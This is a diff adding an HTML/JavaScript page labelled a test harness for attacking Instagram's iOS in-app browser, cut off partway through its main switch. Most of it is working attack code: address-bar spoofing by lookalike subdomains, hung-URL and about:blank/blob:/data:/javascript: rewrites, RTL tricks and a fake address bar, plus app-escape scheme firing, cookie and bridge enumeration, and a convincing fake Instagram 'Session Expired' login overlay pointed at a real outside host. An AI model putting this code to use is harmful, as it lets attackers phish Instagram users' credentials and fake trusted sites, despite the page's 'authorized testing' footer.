@@ -1,0 +1,1006 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Instagram iOS WebView — Address Bar Spoof + Escape Test Harness</title>
+<style>
+  :root{color-scheme:dark}
+  *,*::before,*::after{box-sizing:border-box}
+  html,body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",system-ui,sans-serif}
+  body{background:#0b0d12;color:#e6e8ee;padding:14px 12px 80px;-webkit-text-size-adjust:100%}
+  h1{font-size:17px;margin:0 0 2px}
+  .sub{font-size:11px;color:#8892a8;margin-bottom:12px}
+  .section-title{font-size:13px;font-weight:700;color:#5b6cff;text-transform:uppercase;letter-spacing:.8px;margin:16px 0 8px;padding-top:8px;border-top:1px solid #1e2437}
+  .card{background:#141826;border:1px solid #1e2437;border-radius:11px;padding:10px;margin-bottom:10px}
+  .card h2{font-size:13px;margin:0 0 4px;color:#e6e8ee}
+  .card p{font-size:11px;margin:0 0 8px;color:#a8adba;line-height:1.4}
+  .row{display:flex;flex-wrap:wrap;gap:5px}
+  button,.btn{background:#5b6cff;color:#fff;border:0;border-radius:8px;padding:8px 10px;font-size:12px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-block;-webkit-tap-highlight-color:rgba(91,108,255,.3)}
+  button.alt{background:#253055}
+  button.warn{background:#b03b5a}
+  .pill{display:inline-block;padding:2px 7px;border-radius:999px;font-size:9px;background:#1e2437;color:#8f9bb7;margin-right:3px;letter-spacing:.3px}
+  .log{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:10px;color:#7f8da8;white-space:pre-wrap;word-break:break-all;background:#0f1220;padding:8px;border-radius:7px;max-height:200px;overflow:auto;border:1px solid #1a1f33;-webkit-overflow-scrolling:touch;margin-top:6px}
+  .evidence-on{border-color:#4ade80!important;box-shadow:0 0 0 1px #4ade80 inset}
+  .foot{font-size:10px;color:#6a7293;margin-top:14px}
+  a{color:#8ab4ff}
+  code{background:#0f1220;padding:1px 4px;border-radius:3px;font-size:10px}
+</style>
+</head>
+<body>
+
+<h1>Instagram iOS WebView Test Harness</h1>
+<div class="sub">
+  <span class="pill">ig-webview</span>
+  <span class="pill">ios-wkwebview</span>
+  <span class="pill">iphone-16</span>
+  <span class="pill">bbrd-ref</span>
+</div>
+
+<!-- ============================================================ -->
+<div class="card" id="fp-card">
+  <h2>0 - Fingerprint</h2>
+  <p>Detects Instagram WebView, WKWebView, iOS version, injected JS objects.</p>
+  <div class="log" id="fp"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-title">Category 1 — Address Bar Spoofing</div>
+
+<div class="card">
+  <h2>1A - Long-Subdomain (BBRD: Safari $1k, Zerion, Coinbase)</h2>
+  <p>Instagram's narrow bar shows ~30 chars of hostname. Navigate to
+     <code>apple.com.&lt;padding&gt;.attacker.tld</code> — bar shows "apple.com…"</p>
+  <div class="row">
+    <button onclick="run('1A')">1A: Navigate</button>
+    <button class="alt" onclick="run('1A2')">1A2: iframe</button>
+    <button class="alt" onclick="run('1A3')">1A3: Open new</button>
+    <button class="alt" onclick="cl('l1A')">clear</button>
+  </div>
+  <div class="log" id="l1A"></div>
+</div>
+
+<div class="card">
+  <h2>1B - URL-Freeze / Tab-Hanging (BBRD: Arc $10k, Safari CVE-2025-24128)</h2>
+  <p>Load a URL on a non-responding port. Bar freezes on it. Then write
+     phishing content via <code>document.write</code> or overlay. Bar still
+     shows the frozen (trusted) URL.</p>
+  <div class="row">
+    <button onclick="run('1B')">1B: Port hang</button>
+    <button class="alt" onclick="run('1B2')">1B2: 204 redirect</button>
+    <button class="alt" onclick="run('1B3')">1B3: Slow fetch</button>
+    <button class="alt" onclick="cl('l1B')">clear</button>
+  </div>
+  <div class="log" id="l1B"></div>
+</div>
+
+<div class="card">
+  <h2>1C - about:blank (BBRD: Safari $5k CVE-2025-24113, Google iOS $500)</h2>
+  <p><code>window.open("about:blank")</code> then <code>doc.write(phishing)</code>.
+     Bar may show blank/nothing or inherit parent origin.</p>
+  <div class="row">
+    <button onclick="run('1C')">1C: window.open</button>
+    <button class="alt" onclick="run('1C2')">1C2: iframe about:blank</button>
+    <button class="alt" onclick="run('1C3')">1C3: assign</button>
+    <button class="alt" onclick="cl('l1C')">clear</button>
+  </div>
+  <div class="log" id="l1C"></div>
+</div>
+
+<div class="card">
+  <h2>1D - blob: URI (BBRD: Brave $250, Arc $500, Safari CVE-2025-24113)</h2>
+  <p>Create <code>blob:https://trusted.com/...</code> with phishing HTML.
+     Address bar may display the origin portion of the blob URL.</p>
+  <div class="row">
+    <button onclick="run('1D')">1D: blob navigate</button>
+    <button class="alt" onclick="run('1D2')">1D2: blob iframe</button>
+    <button class="alt" onclick="cl('l1D')">clear</button>
+  </div>
+  <div class="log" id="l1D"></div>
+</div>
+
+<div class="card">
+  <h2>1E - history.pushState / replaceState</h2>
+  <p>After page loads, call <code>history.pushState(null,"","https://apple.com")</code>.
+     Some WebViews update the address bar without actually navigating.</p>
+  <div class="row">
+    <button onclick="run('1E')">1E: pushState</button>
+    <button class="alt" onclick="run('1E2')">1E2: replaceState</button>
+    <button class="alt" onclick="run('1E3')">1E3: cross-origin push</button>
+    <button class="alt" onclick="cl('l1E')">clear</button>
+  </div>
+  <div class="log" id="l1E"></div>
+</div>
+
+<div class="card">
+  <h2>1F - RTL Character Spoof (BBRD: Brave $250, Firefox $2k CVE-2024-11695)</h2>
+  <p>Use Arabic/Hebrew chars in subdomains to reverse display direction in the
+     address bar: <code>&#x202E;</code> (RLO) or RTL subdomains.</p>
+  <div class="row">
+    <button onclick="run('1F')">1F: RTL subdomain</button>
+    <button class="alt" onclick="run('1F2')">1F2: RLO override</button>
+    <button class="alt" onclick="cl('l1F')">clear</button>
+  </div>
+  <div class="log" id="l1F"></div>
+</div>
+
+<div class="card">
+  <h2>1G - data: URI (BBRD: Arc $1k, Brave iOS)</h2>
+  <p>Navigate to <code>data:text/html,&lt;phishing&gt;</code>. Check what
+     address bar shows.</p>
+  <div class="row">
+    <button onclick="run('1G')">1G: data navigate</button>
+    <button class="alt" onclick="run('1G2')">1G2: data iframe</button>
+    <button class="alt" onclick="cl('l1G')">clear</button>
+  </div>
+  <div class="log" id="l1G"></div>
+</div>
+
+<div class="card">
+  <h2>1H - javascript: URI (BBRD: Firefox iOS $2.5k CVE-2025-23108)</h2>
+  <p>Navigate to <code>javascript:document.write(...)</code> via anchor or
+     location. If content replaces page but bar stays on original URL = spoof.</p>
+  <div class="row">
+    <button onclick="run('1H')">1H: anchor click</button>
+    <button class="alt" onclick="run('1H2')">1H2: location</button>
+    <button class="alt" onclick="run('1H3')">1H3: iframe</button>
+    <button class="alt" onclick="cl('l1H')">clear</button>
+  </div>
+  <div class="log" id="l1H"></div>
+</div>
+
+<div class="card">
+  <h2>1I - Fullscreen API fake bar (BBRD: Arc $500, Opera $100)</h2>
+  <p>Request fullscreen, hide real bar, draw CSS overlay that looks like
+     Instagram's address bar showing a trusted domain.</p>
+  <div class="row">
+    <button onclick="run('1I')">1I: Fullscreen + overlay</button>
+    <button class="alt" onclick="cl('l1I')">clear</button>
+  </div>
+  <div class="log" id="l1I"></div>
+</div>
+
+<div class="card">
+  <h2>1J - Meta-refresh timing race</h2>
+  <p>Chain: navigate to <code>https://apple.com</code> but immediately
+     <code>&lt;meta refresh&gt;</code> to attacker. If bar shows apple.com
+     while content is attacker's = spoof.</p>
+  <div class="row">
+    <button onclick="run('1J')">1J: meta refresh</button>
+    <button class="alt" onclick="run('1J2')">1J2: JS redirect race</button>
+    <button class="alt" onclick="cl('l1J')">clear</button>
+  </div>
+  <div class="log" id="l1J"></div>
+</div>
+
+<div class="card">
+  <h2>1K - Invalid Scheme (BBRD: Arc $5k, Naver $200)</h2>
+  <p>Navigate to made-up scheme like <code>httpx://apple.com</code> or
+     malformed URLs. Parser confusion may display wrong hostname.</p>
+  <div class="row">
+    <button onclick="run('1K')">1K: httpx://</button>
+    <button class="alt" onclick="run('1K2')">1K2: https:///</button>
+    <button class="alt" onclick="run('1K3')">1K3: https://apple.com@attacker</button>
+    <button class="alt" onclick="cl('l1K')">clear</button>
+  </div>
+  <div class="log" id="l1K"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-title">Category 2 — WebView Escape / Scheme Hop</div>
+
+<div class="card">
+  <h2>2A - Custom scheme escape (same as Phantom PoC)</h2>
+  <p>Fire <code>mailto:</code>, <code>tel:</code>, <code>sms:</code>,
+     <code>facetime:</code>, <code>shortcuts://</code>,
+     <code>instagram://</code> via hidden iframe. If any opens an external
+     app without prompt = escape bug.</p>
+  <div class="row">
+    <button onclick="run('2A')">2A: Fan-out all</button>
+    <button class="alt" onclick="run('2A2')">2A2: mailto only</button>
+    <button class="alt" onclick="run('2A3')">2A3: tel only</button>
+    <button class="alt" onclick="cl('l2A')">clear</button>
+  </div>
+  <div class="log" id="l2A"></div>
+</div>
+
+<div class="card">
+  <h2>2B - Universal Links escape</h2>
+  <p>Navigate to Universal Links (e.g. <code>https://metamask.app.link/...</code>).
+     If iOS opens the target app from inside IG WebView = escape.</p>
+  <div class="row">
+    <button onclick="run('2B')">2B: iframe</button>
+    <button class="alt" onclick="run('2B2')">2B2: location</button>
+    <button class="alt" onclick="run('2B3')">2B3: anchor</button>
+    <button class="alt" onclick="cl('l2B')">clear</button>
+  </div>
+  <div class="log" id="l2B"></div>
+</div>
+
+<div class="card">
+  <h2>2C - instagram:// deep link self-redirect</h2>
+  <p>Use <code>instagram://</code> scheme to navigate within the app itself.
+     Can we trigger actions like DMs, profile views, or settings changes
+     from a webpage?</p>
+  <div class="row">
+    <button onclick="run('2C')">2C: ig://camera</button>
+    <button class="alt" onclick="run('2C2')">2C2: ig://direct</button>
+    <button class="alt" onclick="run('2C3')">2C3: ig://settings</button>
+    <button class="alt" onclick="cl('l2C')">clear</button>
+  </div>
+  <div class="log" id="l2C"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-title">Category 3 — Session / Data Leak</div>
+
+<div class="card">
+  <h2>3A - Cookie / Storage enumeration</h2>
+  <p>Read <code>document.cookie</code>, <code>localStorage</code>,
+     <code>sessionStorage</code>. IG WebView may share session cookies
+     with the app — session tokens exposed to any page loaded in-app.</p>
+  <div class="row">
+    <button onclick="run('3A')">3A: Enumerate all</button>
+    <button class="alt" onclick="cl('l3A')">clear</button>
+  </div>
+  <div class="log" id="l3A"></div>
+</div>
+
+<div class="card">
+  <h2>3B - Injected JS objects / postMessage</h2>
+  <p>Check for Instagram-injected JS bridge objects
+     (<code>window.IG*</code>, <code>webkit.messageHandlers.*</code>).
+     Also listen for any <code>postMessage</code> from IG native.</p>
+  <div class="row">
+    <button onclick="run('3B')">3B: Enumerate bridges</button>
+    <button class="alt" onclick="cl('l3B')">clear</button>
+  </div>
+  <div class="log" id="l3B"></div>
+</div>
+
+<div class="card">
+  <h2>3C - Clipboard read / Geolocation / Camera</h2>
+  <p>Test if IG WebView grants sensitive permissions automatically
+     (clipboard, geolocation, camera/mic) without prompting.</p>
+  <div class="row">
+    <button onclick="run('3C')">3C: clipboard</button>
+    <button class="alt" onclick="run('3C2')">3C2: geolocation</button>
+    <button class="alt" onclick="run('3C3')">3C3: camera</button>
+    <button class="alt" onclick="cl('l3C')">clear</button>
+  </div>
+  <div class="log" id="l3C"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-title">Category 4 — UI Manipulation / Phishing</div>
+
+<div class="card">
+  <h2>4A - CSS overlay fake Instagram login</h2>
+  <p>Draw a pixel-perfect Instagram login dialog using only CSS,
+     positioned over the WebView content. Captures credentials typed
+     into the fake form.</p>
+  <div class="row">
+    <button onclick="run('4A')">4A: Show fake login</button>
+    <button class="alt" onclick="cl('l4A')">clear</button>
+  </div>
+  <div class="log" id="l4A"></div>
+</div>
+
+<div class="card">
+  <h2>4B - Scroll-based bar hide + fake bar</h2>
+  <p>On iOS WKWebView, scrolling down often hides the address bar.
+     Fill remaining space with a fake bar showing a trusted domain.</p>
+  <div class="row">
+    <button onclick="run('4B')">4B: Scroll trigger</button>
+    <button class="alt" onclick="cl('l4B')">clear</button>
+  </div>
+  <div class="log" id="l4B"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="card" id="ev-card">
+  <h2>Evidence Monitor</h2>
+  <p>Hooks <code>visibilitychange</code>, <code>pagehide</code>,
+     <code>blur</code>, <code>resize</code>.</p>
+  <div class="log" id="evidence"></div>
+</div>
+
+<div class="foot">
+  For authorized security testing only. iPhone 16 + latest Instagram iOS.<br>
+  BBRD reference: address_bar_spoofing.json (963 lines, 12 techniques).
+</div>
+
+<!-- Fake login overlay (hidden by default) -->
+<div id="fake-login" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:rgba(0,0,0,.65);align-items:center;justify-content:center">
+  <div style="background:#fff;border-radius:14px;width:300px;padding:28px 22px;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text',sans-serif">
+    <div style="width:56px;height:56px;margin:0 auto 14px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);border-radius:14px;display:flex;align-items:center;justify-content:center">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+    </div>
+    <div style="font-size:15px;font-weight:600;color:#262626;margin-bottom:4px">Session Expired</div>
+    <div style="font-size:12px;color:#8e8e8e;margin-bottom:18px">Please log in again to continue</div>
+    <input id="fake-user" type="text" placeholder="Username or email" style="width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:8px;font-size:14px;margin-bottom:8px;background:#fafafa;outline:none">
+    <input id="fake-pass" type="password" placeholder="Password" style="width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:8px;font-size:14px;margin-bottom:12px;background:#fafafa;outline:none">
+    <button id="fake-btn" style="width:100%;padding:10px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600">Log In</button>
+    <div style="font-size:11px;color:#8e8e8e;margin-top:12px">This is a PoC demo. No data is sent.</div>
+  </div>
+</div>
+
+<!-- Fake address bar (hidden by default) -->
+<div id="fake-bar" style="display:none;position:fixed;top:0;left:0;width:100%;z-index:99998;background:#fff;padding:6px 12px;box-shadow:0 1px 3px rgba(0,0,0,.12)">
+  <div style="display:flex;align-items:center;gap:8px">
+    <svg width="16" height="16" fill="#0095f6" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    <div style="flex:1;background:#efefef;border-radius:6px;padding:6px 10px;font-size:13px;font-family:-apple-system,sans-serif;color:#262626">
+      <span style="color:#0095f6">&#x1F512;</span> instagram.com
+    </div>
+    <svg width="18" height="18" fill="#262626" viewBox="0 0 24 24"><path d="M6 18L18 6M6 6l12 12" stroke="#262626" stroke-width="2"/></svg>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+ * Instagram iOS WebView — All-in-one Test Harness
+ * Target: Instagram iOS (latest) on iPhone 16
+ * Uses: WKWebView (confirmed via fingerprint)
+ * BBRD techniques: Long-Subdomain, URL-Freeze, about:blank,
+ *   blob:, RTL, Fullscreen, data:, javascript:, Invalid-Scheme,
+ *   history.pushState, meta-refresh timing
+ * ============================================================ */
+
+/* ---------- config ------------------------------------------- */
+var ATTACKER_BASE = "https://ajaone.github.io/testing-repository/test";
+var LONG_SUB_HOST =
+  "instagram.com" +
+  ".account-security-verification-required-2fa-update" +
+  ".ajaone.github.io";
+var SPOOF_URL = "https://" + LONG_SUB_HOST + "/testing-repository/test/ig-phish-landing.html";
+
+/* ---------- utils -------------------------------------------- */
+function $(id){ return document.getElementById(id) }
+function ts(){ return new Date().toISOString().substr(11,12) }
+function log(id,s){
+  var el=$(id); if(!el) return;
+  el.textContent += "["+ts()+"] "+s+"\n";
+  el.scrollTop = el.scrollHeight;
+}
+function cl(id){ if($(id)) $(id).textContent="" }
+
+function fireIframe(uri,tag){
+  var f=document.createElement("iframe");
+  f.style.cssText="display:none;width:0;height:0;border:0;position:absolute;left:-9999px";
+  f.src=uri;
+  document.body.appendChild(f);
+  setTimeout(function(){try{f.remove()}catch(e){}},2500);
+  log(tag,"iframe.src = "+uri.slice(0,100));
+}
+
+function fireAnchor(uri,tag){
+  var a=document.createElement("a");
+  a.href=uri;a.rel="noopener";a.style.display="none";
+  document.body.appendChild(a);
+  try{a.click()}catch(e){log(tag,"click err: "+e)}
+  log(tag,"a.click() = "+uri.slice(0,100));
+  setTimeout(function(){try{a.remove()}catch(e){}},1000);
+}
+
+/* phishing page content (self-contained) */
+var PHISH_HTML =
+  '<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">'+
+  '<title>Instagram</title><style>body{margin:0;padding:40px 20px;font-family:-apple-system,sans-serif;background:#fafafa;text-align:center}'+
+  '.logo{font-size:32px;font-family:cursive;margin-bottom:20px}input{width:100%;max-width:300px;padding:10px;border:1px solid #dbdbdb;border-radius:6px;'+
+  'margin:4px 0;font-size:14px;background:#fafafa}button{width:100%;max-width:320px;padding:10px;background:#0095f6;color:#fff;border:0;border-radius:6px;'+
+  'font-size:14px;font-weight:600;margin-top:8px}</style></head>'+
+  '<body><div class=logo>Instagram</div><p style="color:#8e8e8e;font-size:13px">Session expired. Please log in.</p>'+
+  '<input placeholder="Username or email"><input type=password placeholder="Password"><button>Log In</button>'+
+  '<p style="color:#ccc;font-size:10px;margin-top:20px">PoC demo — no data sent</p>'+
+  '<scr'+'ipt>document.title="Instagram";</scr'+'ipt></body></html>';
+
+/* ---------- fingerprint -------------------------------------- */
+(function(){
+  var ua=navigator.userAgent||"";
+  var isiOS=/iPhone|iPad|iPod/.test(ua);
+  var iosVer=(ua.match(/OS (\d+[_\.]\d+)/)||[])[1]||"?";
+  var isWK=!!(window.webkit&&window.webkit.messageHandlers);
+  var isIG=/Instagram/i.test(ua);
+  var igVer=(ua.match(/Instagram\s*(\d[\d.]*)/i)||[])[1]||"?";
+  var isFB=/FBAN|FBAV/i.test(ua);
+
+  log("fp","ua = "+ua);
+  log("fp","iOS = "+isiOS+" (v"+iosVer.replace("_",".")+")");
+  log("fp","WKWebView = "+isWK);
+  log("fp","Instagram = "+isIG+" (v"+igVer+")");
+  log("fp","FB SDK in UA = "+isFB);
+  log("fp","window.webkit.messageHandlers = "+isWK);
+  log("fp","screen = "+screen.width+"x"+screen.height+" @"+(window.devicePixelRatio||1)+"x");
+  log("fp","document.referrer = "+(document.referrer||"(empty)"));
+  log("fp","window.name = "+(window.name||"(empty)"));
+  log("fp","navigator.standalone = "+navigator.standalone);
+
+  if(isIG) $("fp-card").classList.add("evidence-on");
+  if(!isiOS) log("fp","WARNING: not iOS — harness optimized for iOS");
+})();
+
+/* ---------- evidence ----------------------------------------- */
+var START=0;
+function markEv(src){
+  var dt=START?(Date.now()-START)+"ms":"(idle)";
+  log("evidence","EVENT: "+src+" @ "+dt);
+  $("ev-card").classList.add("evidence-on");
+}
+document.addEventListener("visibilitychange",function(){
+  if(document.hidden) markEv("visibilitychange (hidden)");
+  else log("evidence","returned to foreground");
+});
+window.addEventListener("pagehide",function(){markEv("pagehide")});
+window.addEventListener("blur",function(){markEv("blur")});
+var lastW=window.innerWidth;
+window.addEventListener("resize",function(){
+  if(window.innerWidth!==lastW){lastW=window.innerWidth;log("evidence","resize event")}
+});
+
+/* ---------- postMessage listener (3B) ------------------------ */
+window.addEventListener("message",function(e){
+  log("l3B","postMessage from "+e.origin+": "+JSON.stringify(e.data).slice(0,200));
+});
+
+/* ============================================================ */
+function run(c){
+  START=Date.now();
+  /* derive log id from first 2-3 chars: "1A" -> "l1A", "2A2" -> "l2A" */
+  var tag="l"+c.replace(/\d+$/,"");
+  if(!$(tag)) tag="l"+c.slice(0,2);
+  log(tag,"==== Case "+c+" ====");
+
+  switch(c){
+
+  /* ============ CATEGORY 1: ADDRESS BAR SPOOFING ============ */
+
+  /* 1A: Long-Subdomain — navigate */
+  case "1A":
+    log(tag,"location -> "+SPOOF_URL.slice(0,90));
+    try{window.location.href=SPOOF_URL}catch(e){log(tag,"err: "+e)}
+    break;
+
+  /* 1A2: Long-Subdomain — iframe */
+  case "1A2":
+    fireIframe(SPOOF_URL,tag);
+    break;
+
+  /* 1A3: Long-Subdomain — window.open */
+  case "1A3":
+    log(tag,"window.open -> "+SPOOF_URL.slice(0,80));
+    try{var w=window.open(SPOOF_URL,"_blank");log(tag,"returned: "+(w?"Window":"null/blocked"))}
+    catch(e){log(tag,"err: "+e)}
+    break;
+
+  /* 1B: URL-Freeze via non-responding port */
+  case "1B":{
+    /* Navigate to trusted site on a high port that won't respond.
+       Address bar shows the trusted URL while it loads forever.
+       We race to write content before it times out. */
+    var hangUrl="https://instagram.com:8443/accounts/login/";
+    log(tag,"opening hanging URL: "+hangUrl);
+    try{
+      var w2=window.open(hangUrl,"_blank");
+      if(w2){
+        setTimeout(function(){
+          try{
+            w2.document.open();
+            w2.document.write(PHISH_HTML);
+            w2.document.close();
+            log(tag,"wrote phishing content into hung window");
+          }catch(e){log(tag,"write err (expected if cross-origin): "+e)}
+        },800);
+      } else {
+        log(tag,"window.open blocked");
+      }
+    }catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1B2: 204 redirect freeze */
+  case "1B2":{
+    /* Navigate iframe to a URL that returns 204 No Content.
+       Some WebViews keep the previous URL in the bar. */
+    log(tag,"iframe -> /204-endpoint (simulated via about:blank)");
+    var f=document.createElement("iframe");
+    f.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0";
+    f.src="about:blank";
+    document.body.appendChild(f);
+    setTimeout(function(){
+      try{
+        f.contentDocument.open();
+        f.contentDocument.write(PHISH_HTML);
+        f.contentDocument.close();
+        log(tag,"wrote phishing into fullscreen iframe");
+      }catch(e){log(tag,"err: "+e)}
+    },500);
+    break;
+  }
+
+  /* 1B3: slow fetch — start loading, pushState during load */
+  case "1B3":{
+    log(tag,"starting slow image fetch to keep loading state...");
+    var img=new Image();
+    img.src="https://instagram.com:9443/slow-image.png?t="+Date.now();
+    setTimeout(function(){
+      try{
+        history.pushState(null,"Instagram","https://"+location.host+"/accounts/login/");
+        log(tag,"pushState during loading: "+location.href);
+      }catch(e){log(tag,"pushState err: "+e)}
+    },200);
+    break;
+  }
+
+  /* 1C: about:blank window.open */
+  case "1C":{
+    log(tag,"window.open('about:blank')...");
+    try{
+      var w3=window.open("about:blank","_blank");
+      if(w3){
+        log(tag,"child opened, writing content...");
+        setTimeout(function(){
+          try{
+            w3.document.open();
+            w3.document.write(PHISH_HTML);
+            w3.document.close();
+            log(tag,"phishing written. Bar should show about:blank or nothing.");
+          }catch(e){log(tag,"write err: "+e)}
+        },300);
+      }else{log(tag,"blocked by popup blocker")}
+    }catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1C2: about:blank via iframe (fullscreen) */
+  case "1C2":{
+    var f2=document.createElement("iframe");
+    f2.src="about:blank";
+    f2.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0";
+    document.body.appendChild(f2);
+    setTimeout(function(){
+      try{
+        f2.contentDocument.open();
+        f2.contentDocument.write(PHISH_HTML);
+        f2.contentDocument.close();
+        log(tag,"fullscreen about:blank iframe with phishing content");
+      }catch(e){log(tag,"err: "+e)}
+    },200);
+    break;
+  }
+
+  /* 1C3: location.assign about:blank then pushState */
+  case "1C3":{
+    log(tag,"assign about:blank then push...");
+    fireIframe("about:blank",tag);
+    /* try pushState after */
+    setTimeout(function(){
+      try{
+        history.pushState(null,"","about:blank");
+        document.title="Instagram";
+        log(tag,"pushState to about:blank, title=Instagram");
+      }catch(e){log(tag,"err: "+e)}
+    },500);
+    break;
+  }
+
+  /* 1D: blob: URI navigate */
+  case "1D":{
+    var blob=new Blob([PHISH_HTML],{type:"text/html"});
+    var burl=URL.createObjectURL(blob);
+    log(tag,"blob URL = "+burl.slice(0,60));
+    try{window.location.href=burl}catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1D2: blob iframe */
+  case "1D2":{
+    var blob2=new Blob([PHISH_HTML],{type:"text/html"});
+    var burl2=URL.createObjectURL(blob2);
+    var fi=document.createElement("iframe");
+    fi.src=burl2;
+    fi.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0";
+    document.body.appendChild(fi);
+    log(tag,"fullscreen blob iframe. Check address bar.");
+    break;
+  }
+
+  /* 1E: history.pushState */
+  case "1E":{
+    try{
+      history.pushState(null,"Instagram","/accounts/login/?next=%2F");
+      document.title="Instagram \u00B7 Log in";
+      log(tag,"pushState -> "+location.href);
+      log(tag,"title -> "+document.title);
+    }catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1E2: replaceState */
+  case "1E2":{
+    try{
+      history.replaceState(null,"Instagram","/accounts/login/");
+      document.title="Log in \u00B7 Instagram";
+      log(tag,"replaceState -> "+location.href);
+    }catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1E3: cross-origin pushState (should fail, but test) */
+  case "1E3":{
+    try{
+      history.pushState(null,"","https://instagram.com/accounts/login/");
+      log(tag,"UNEXPECTED: cross-origin pushState succeeded! -> "+location.href);
+    }catch(e){
+      log(tag,"expected SecurityError: "+e.message.slice(0,80));
+    }
+    break;
+  }
+
+  /* 1F: RTL subdomain */
+  case "1F":{
+    /* Use Arabic chars in subdomain — causes RTL rendering */
+    var rtlUrl="https://"+encodeURIComponent("\u0645\u0648\u0642\u0639")+".instagram.com.ajaone.github.io/testing-repository/test/ig-phish-landing.html";
+    log(tag,"RTL url = "+rtlUrl);
+    try{window.location.href=rtlUrl}catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1F2: RLO character in URL */
+  case "1F2":{
+    var rloUrl="https://ajaone.github.io/testing-repository/test/ig-phish-landing.html?\u202Emoc.margatsni";
+    log(tag,"RLO url = "+rloUrl);
+    fireAnchor(rloUrl,tag);
+    break;
+  }
+
+  /* 1G: data: URI navigate */
+  case "1G":{
+    var dataUri="data:text/html;base64,"+btoa(PHISH_HTML);
+    log(tag,"data: URI navigate ("+dataUri.length+" chars)");
+    try{window.location.href=dataUri}catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1G2: data: iframe */
+  case "1G2":{
+    var dataUri2="data:text/html;base64,"+btoa(PHISH_HTML);
+    var di=document.createElement("iframe");
+    di.src=dataUri2;
+    di.style.cssText="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0";
+    document.body.appendChild(di);
+    log(tag,"fullscreen data: iframe");
+    break;
+  }
+
+  /* 1H: javascript: URI via anchor */
+  case "1H":{
+    var jsUri='javascript:document.write('+JSON.stringify(PHISH_HTML)+');void(0)';
+    fireAnchor(jsUri,tag);
+    break;
+  }
+
+  /* 1H2: javascript: via location */
+  case "1H2":{
+    log(tag,"location = javascript:...");
+    try{window.location.href='javascript:document.write('+JSON.stringify(PHISH_HTML)+');void(0)'}
+    catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1H3: javascript: via iframe */
+  case "1H3":{
+    fireIframe('javascript:document.write('+JSON.stringify(PHISH_HTML)+');void(0)',tag);
+    break;
+  }
+
+  /* 1I: Fullscreen API + fake bar overlay */
+  case "1I":{
+    log(tag,"requesting fullscreen...");
+    var el=document.documentElement;
+    var rfs=el.requestFullscreen||el.webkitRequestFullscreen;
+    if(rfs){
+      try{
+        rfs.call(el);
+        setTimeout(function(){
+          $("fake-bar").style.display="block";
+          log(tag,"fullscreen active + fake bar shown");
+        },500);
+      }catch(e){log(tag,"fullscreen err: "+e)}
+    }else{
+      /* fallback: just show fake bar (iOS may not support Fullscreen API in WKWebView) */
+      $("fake-bar").style.display="block";
+      document.body.style.paddingTop="50px";
+      log(tag,"no Fullscreen API, showing fake bar overlay instead");
+    }
+    break;
+  }
+
+  /* 1J: meta-refresh timing race */
+  case "1J":{
+    log(tag,"injecting meta-refresh to attacker after 0s...");
+    var m=document.createElement("meta");
+    m.httpEquiv="refresh";
+    m.content="0;url="+SPOOF_URL;
+    document.head.appendChild(m);
